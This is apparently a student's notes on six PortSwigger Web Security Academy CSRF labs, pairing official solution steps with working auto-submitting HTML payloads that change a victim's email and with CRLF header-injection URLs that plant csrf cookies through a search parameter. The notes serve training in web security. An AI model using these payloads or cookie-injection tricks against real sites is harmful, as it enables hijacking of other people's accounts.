
## **1. CSRF vulnerability with no defenses**
This lab's email change functionality is vulnerable to CSRF.
1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. If you're using [Burp Suite Professional](https://portswigger.net/burp/pro), right-click on the request and select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".
    Alternatively, if you're using [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload), use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL".
    `<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="anything%40web-security-academy.net"> </form> <script> document.forms[0].submit(); </script>`
    
3. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
4. To verify that the exploit works, try it on yourself by clicking "View exploit" and then check the resulting HTTP request and response.
5. Change the email address in your exploit so that it doesn't match your own.
6. Click "Deliver to victim" to solve the lab.

Vulnerable parameter - email change functionality
Goal - exploit the CSRF vulnerability and change the email address
creds - wiener:peter

In order for a CSRF attack to be possible:
- A relevant action - email change functionality
- Cookie based session handling - session cookie
- No unpredictable request parameters - **satisfied** (****no csrf token is present)**

![[Pasted image 20240920205439.png]]

- HTML payload (form action= "https://HOST/POST")
```
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://target-acb91feb1e053ea78076271500a20022.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

- Delivering trough a python server (https://localserver:8000/path/to/file)
```
python3 -m http.server <port-number>
```

- Accessing the above link will redirect the target to the 'desired' website meanwhile the reset email will be changed per our html script(payload)

## **2. CSRF where token validation depends on request method**
This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests. 
1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that if you change the value of the `csrf` parameter then the request is rejected.
3. Use "Change request method" on the context menu to convert it into a GET request and observe that the CSRF token is no longer verified.
4. If you're using [Burp Suite Professional](https://portswigger.net/burp/pro), right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".
    
    Alternatively, if you're using [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload), use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL".
    
    `<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="anything%40web-security-academy.net"> </form> <script> document.forms[0].submit(); </script>`
5. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
6. To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.
7. Change the email address in your exploit so that it doesn't match your own.
8. Store the exploit, then click "Deliver to victim" to solve the lab.


Vulnerable parameter - email change functionality
Goal - exploit CSRF to change email address
Creds - wiener:peter

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters: **Request method can be changed to GET which does not require CSRF token**

Testing CSRF Tokens:
1. Change the request method from POST to GET.

![[Pasted image 20240920210251.png]]
![[Pasted image 20240920210319.png]]
![[Pasted image 20240920210345.png]]
- now we can remove the CSRF token:
![[Pasted image 20240920210450.png]]

- HTML payload (form action="https://HOST/POST")
```
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://target-acee1f521e65f40d80e4b992006a0005.web-security-academy.net/my-account/change-email/" method="GET" target="csrf-iframe" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

- Delivering trough a python server (https://localserver:8000/path/to/file)
```
python3 -m http.server <port-number>
```

- Accessing the above link will redirect the target to the 'desired' website meanwhile the reset email will be changed per our html script(payload)

## **3. CSRF where token validation depends on token being present**
This lab's email change functionality is vulnerable to CSRF. 

1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that if you change the value of the `csrf` parameter then the request is rejected.
3. Delete the `csrf` parameter entirely and observe that the request is now accepted.
4. If you're using [Burp Suite Professional](https://portswigger.net/burp/pro), right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".
    Alternatively, if you're using [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload), use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL"
    `<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="$param1name" value="$param1value"> </form> <script> document.forms[0].submit(); </script>`
5. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
6. To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.
7. Change the email address in your exploit so that it doesn't match your own.
8. Store the exploit, then click "Deliver to victim" to solve the lab.


Vulnerable parameter - email change functionality
Goal - exploit CSRF to change email address
Creds - wiener:peter

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters: csrf token **is not mandatory**

Testing CSRF Tokens:
1. Change the request method from POST to GET.
2.  Remove the CSRF token and see if application accepts request.

- removing csrf token and forwards the post request we observe that application accept the request so we can proceed further with the exploit which is a basic one (as first example - no defense due to lack of csrf token)

![[Pasted image 20240921183028.png]]
![[Pasted image 20240921183005.png]]

- HTML payload (form action="https://HOST/POST")
```
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://target-acc61fc61e3d7e1e800e3f9d001500fa.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form" target="csrf-iframe">
        <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

- Delivering trough a python server (https://localserver:8000/path/to/file)
```
python3 -m http.server <port-number>
```

## **4. CSRF where token is not tied to user session**
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.
1. Open Burp's browser and log in to your account. Submit the "Update email" form, and intercept the resulting request.
2. Make a note of the value of the CSRF token, then drop the request.
3. Open a private/incognito browser window, log in to your other account, and send the update email request into Burp Repeater.
4. Observe that if you swap the CSRF token with the value from the other account, then the request is accepted.
5. Create and host a proof of concept exploit as described in the solution to the [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses) lab. Note that the CSRF tokens are single-use, so you'll need to include a fresh one.
6. Change the email address in your exploit so that it doesn't match your own.
7. Store the exploit, then click "Deliver to victim" to solve the lab.

Vulnerable parameter - email change functionality
Goal - exploit CSRF to change email address
Credentials - wiener:peter, carlos:montoya

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters: csrf token is not tied to user session

Testing CSRF Tokens:
1. Remove the CSRF token and see if application accepts request
2. Change the request method from POST to GET
3. See if CSRF token is tied to user session (try with incognito mode)

- try to change csrf token in order to see if it is accepted or not(if it is checked in the backend)
	if is not -> check if csrf token is tied to the user's session cookie:
		- use csrf token from another account using incognito mode :)
			if is accepted --> the csrf token is not tied to the user's session 

- HTML payload:
```
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://target-ac941f081e38bc8480279ef400d5002f.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
            <input type="hidden" name="email" value="test5@test.ca">
            <input type="hidden" name="csrf" value="zXqP4oMlBXDX16q4Qb5MgFawPZXaK4bW">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>

    </body>
</html>
```

- Delivering trough a python server (https://localserver:8000/path/to/file)
```
python3 -m http.server <port-number>
```

# 5. CSRF where token is tied to non-session cookie
  
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.
1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that changing the `session` cookie logs you out, but changing the `csrfKey` cookie merely results in the CSRF token being rejected. This suggests that the `csrfKey` cookie may not be strictly tied to the session.
3. Open a private/incognito browser window, log in to your other account, and send a fresh update email request into Burp Repeater.
4. Observe that if you swap the `csrfKey` cookie and `csrf` parameter from the first account to the second account, the request is accepted.
5. Close the Repeater tab and incognito browser.
6. Back in the original browser, perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
7. Create a URL that uses this vulnerability to inject your `csrfKey` cookie into the victim's browser:
    `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None`
8. Create and host a proof of concept exploit as described in the solution to the [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses) lab, ensuring that you include your CSRF token. The exploit should be created from the email change request.
9. Remove the auto-submit `<script>` block, and instead add the following code to inject the cookie:
    `<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`
10. Change the email address in your exploit so that it doesn't match your own.
11. Store the exploit, then click "Deliver to victim" to solve the lab.

Vulnerable parameter - email change functionality
Goal - exploit CSRF to change email address
Creds - wiener:peter, carlos:montoya

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters 

Testing CSRF Tokens:
1. Remove the CSRF token and see if application accepts request
2. Change the request method from POST to GET
3. See if csrf token is tied to user session

Testing CSRF Tokens and CSRF cookies:
1. Check if the CSRF token is tied to the CSRF cookie
   - Submit an invalid CSRF token
   - Submit a valid CSRF token from another user
2. Submit valid CSRF token AND cookie from another user

csrf token: SXsROOTp3jzq6M5UzIL2KkJIqGpffIQb
csrf cookie: ho7GGxMe4EZSrQ8xZ0sBDq2yW0ey9bKH

In order to exploit this vulnerability, we need to perform 2 things:
1. Inject a csrf cookie in the user's session (HTTP Header injection) - satisfied
2. Send a CSRF attack to the victim with a known csrf token


- after taking a valid csrf token and cookie from another user we have to inject the csrf cookie into header (we will use search functionality in order to see if a search cookie parameter is generated and we will inject over there)
	![[Pasted image 20240922003407.png]]

![[Pasted image 20240922003858.png]]

![[Pasted image 20240922010507.png]]

- HTML payload (form action= https://HOST/POST (change email request - first tab) | 
               img src= https://HOST/POST(injected header - second tab) )
```
<html>
    <body>
        <h1>Hello World!</h1>
        <form action="https:///0a33009903154da184367954005e0013.web-security-academy.net/my-account/change-email" method="post" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
            <input type="hidden" name="csrf" value="UYjqwyyGyrsnr8qGu5adRFltwGbIS8S6">
        </form>

        <img src="https://0a33009903154da184367954005e0013.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=04WkQgPVzQFtURvOaoJEwc04UjhQb5Gb%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
```

- Delivering trough a python server (https://localserver:8000/path/to/file)
```
python3 -m http.server <port-number>
```

# 6. CSRF where token is duplicated in cookie

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.
1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that the value of the `csrf` body parameter is simply being validated by comparing it with the `csrf` cookie.
3. Perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
4. Create a URL that uses this vulnerability to inject a fake `csrf` cookie into the victim's browser:
    `/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None`
5. Create and host a proof of concept exploit as described in the solution to the [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses) lab, ensuring that your CSRF token is set to "fake". The exploit should be created from the email change request.
6. Remove the auto-submit `<script>` block and instead add the following code to inject the cookie and submit the form:
    `<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>`
7. Change the email address in your exploit so that it doesn't match your own.

Vulnerable parameter - email change functionality
Goal - exploit CSRF to change email address
Creds - wiener:peter

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters 

Testing CSRF Tokens:
1. Remove the CSRF token and see if application accepts request
2. Change the request method from POST to GET
3. See if csrf token is tied to user session

Testing CSRF Tokens and CSRF cookies:
1. Check if the CSRF token is tied to the CSRF cookie
   - Submit an invalid CSRF token
   - Submit a valid CSRF token from another user
2. Submit valid CSRF token and cookie from another user

In order to exploit this vulnerability, we need to perform 2 things:
1. Inject a csrf cookie in the user's session (HTTP Header injection) - satisfied
2. Send a CSRF attack to the victim with a known csrf token

- as it can be seen, it doesn't matter the value of the cookie as soon as are equal
![[Pasted image 20240922012718.png]]
![[Pasted image 20240922012739.png]]

- we will inject to cookie header trough the search set cookie value which will be equal to the csrf token (first tab)
![[Pasted image 20240922013015.png]]

- HTML payload (form action= https://HOST/POST (change email request - first tab) | 
               img src= https://HOST/POST(injected header - second tab) )
```
<html>
    <body>
        <h1>Hello World!</h1>
        <form action="https://0a25003904014c148065ad2c00ae00af.web-security-academy.net/my-account/change-email" method="post">
            <input type="hidden" name="email" value="test5@test.ca">
            <input type="hidden" name="csrf" value="hacked">
        </form>

        <img src="https://0a25003904014c148065ad2c00ae00af.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=hacked%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```

- Delivering trough a python server (https://localserver:8000/path/to/file)
```
python3 -m http.server <port-number>
```


